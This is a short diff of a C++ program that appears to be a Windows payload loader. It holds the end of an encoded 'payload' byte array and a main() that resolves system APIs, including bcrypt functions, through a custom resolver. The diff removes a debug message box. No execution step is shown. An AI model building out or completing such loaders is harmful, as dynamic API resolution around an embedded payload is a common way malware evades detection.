@@ -55,10 +55,10 @@ unsigned char payload[] =
 "\x1c\xd7\xa5\x7b\x60\x05\x02\x26\xd5\x6c\x43";
 
 
-
-
 int main()
 {
+	NTSTATUS status = NULL;
+	
 	API::APIResolver &resolver = API::APIResolver::GetInstance();
 
 	resolver.LoadModules();
@@ -66,7 +66,4 @@ int main()
 
 	API::API_ACCESS  api = resolver.GetAPIAccess();
 
-		if (api.func.pBCryptCloseAlgorithmProvider)
-			MessageBoxA(NULL, "found", "found", NULL);
-			return 1;
 }
